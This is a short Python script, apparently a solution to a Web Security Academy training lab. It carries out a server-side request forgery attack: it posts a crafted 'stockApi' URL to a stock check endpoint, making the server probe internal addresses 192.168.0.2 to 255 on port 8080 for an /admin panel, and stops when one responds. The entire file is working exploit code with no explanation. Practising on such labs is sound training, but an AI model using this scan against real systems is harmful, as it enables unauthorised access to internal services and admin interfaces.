import requests

url = 'https://ac701fa31f5c386580184a1500cc00a6.web-security-academy.net/product/stock'

for i in range(2,256):
    data = {'stockApi':'http://192.168.0.'+str(i)+':8080/admin'}
    response = requests.post(url,data=data)

    print(i)
    if 'Could not connect to external stock check service' not in response.text:
        break;

